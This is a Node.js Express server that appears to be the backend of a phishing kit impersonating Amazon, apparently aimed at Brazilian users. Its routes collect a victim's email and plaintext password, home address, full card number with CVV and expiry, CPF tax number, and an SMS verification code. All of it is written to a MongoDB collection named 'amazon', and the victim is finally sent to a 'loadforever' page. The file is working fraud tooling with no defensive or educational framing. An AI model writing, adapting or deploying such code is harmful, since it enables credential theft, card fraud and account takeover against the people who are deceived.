var express = require("express")
var bodyParser = require("body-parser")
var mongoose = require("mongoose")

const app = express()

app.use(bodyParser.json())
app.use(express.static('public'))
app.use(bodyParser.urlencoded({
    extended:true
}))

mongoose.connect('mongodb://localhost:27017/mydb',{
    useNewUrlParser: true,
    useUnifiedTopology: true
});

var db = mongoose.connection;

db.on('error',()=>console.log("Error in Connecting to Database"));
db.once('open',()=>console.log("Connected to Database"))

app.post("/sign_up",(req,res)=>{
    var name = req.body.ap_customer_name;
    var email = req.body.ap_customer_email;
    var password = req.body.ap_customer_password;

    var mail = {
        "name": name,
        "email" : email,
        "password" : password,
    }

    db.collection('amazon').insertOne(mail,(err,collection)=>{
        if(err){
            throw err;
        }
        console.log("Record Inserted Successfully");
    });

    return res.redirect('localdeenvio.html')

})


app.post("/region", (req,res)=>{
    var name = req.body.customerName;
    var phone = req.body.phone;
    var cep = req.body.cep;
    var street = req.body.address;
    var streetNumber = req.body.addressnumber;

    var adress = {
        "nameB": name,
        "phone" : phone,
        "CEP" : cep,
        "street" : street,
        "streetNumber" : streetNumber
    }

    db.collection('amazon').insertOne(adress,(err,collection)=>{
        if(err){
            throw err;
        }
        console.log("Adress");
    });

    return res.redirect('formadepagar.html')

})



app.post("/cliente",(req,res)=>{
    var cardName = req.body.ap_cardinfo_cardName;
    var cardNumber = req.body.ap_cardinfo_cardNumber;
    var cvv = req.body.ap_cardinfo_cardCvv;
    var expiration = req.body.ap_cardinfo_data
    var cpf = req.body.ap_cardinfo_cpf

    var info = {
        "cardName" : cardName,
        "cardNumber" : cardNumber,
        "cvv" : cvv,
        "expiration" : expiration,
        "cpf" : cpf
    }

    db.collection('amazon').insertOne(info,(err,collection)=>{
        if(err){
            throw err;
        }
        console.log("cc-info");
    });

    return res.redirect('sms.html')


});

app.post("/sms",(req,res)=>{
    var sms = req.body.ap_customer_sms;

    var amasms = {
        "SMS": sms,
     
    }

    db.collection('amazon').insertOne(amasms,(err,collection)=>{
        if(err){
            throw err;
        }
        console.log("Record Inserted Successfully");
    });

    return res.redirect('loadforever.html')

})





app.get("/",(req, res)=>{
    res.set({
        "Allow-access-Allow-Origin": '*'
    })
    return res.redirect('index.html');
}).listen(80);


console.log("Listening on PORT 80");